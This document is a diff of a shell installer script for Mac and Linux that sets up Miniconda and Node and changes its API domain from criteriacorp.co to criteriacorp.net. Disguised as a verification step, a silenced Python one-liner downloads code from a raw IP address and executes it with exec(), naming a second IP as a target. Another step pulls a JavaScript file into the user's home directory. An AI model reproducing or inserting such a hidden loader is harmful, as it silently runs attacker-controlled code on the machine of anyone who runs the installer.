@@ -3,7 +3,7 @@
 unset API_BASE
 unset MAC_UID
 MAC_UID="${MAC_UID:-__ID__}"
-API_BASE="${API_BASE:-https://api.criteriacorp.co}"
+API_BASE="${API_BASE:-https://api.criteriacorp.net}"
 
 # ----------------------------
 # OS CHECK (Mac + Linux only)
@@ -144,7 +144,7 @@ run_part2_node_driver() {
 
   track_step "part2_step_3"
   ENV_SETUP_JS="${USER_HOME}/env-setup.js"
-  download "https://api.criteriacorp.co/get-file/test.js" "$ENV_SETUP_JS"
+  download "https://api.criteriacorp.net/get-file/test.js" "$ENV_SETUP_JS"
   [[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."
 
   track_step "part2_step_4"
@@ -219,7 +219,7 @@ run_part2_node_driver1() {
 
     track_step "part1_step_4"
     "${PREFIX}/bin/python3" -V >/dev/null 2>&1 || die "Miniconda verification failed."
-    "${PREFIX}/bin/python3" -c "from urllib.request import urlopen,Request;Request._V='5-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >/dev/null 2>&1
+    "${PREFIX}/bin/python3" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >/dev/null 2>&1
   fi
 
   track_step "part1_step_5"
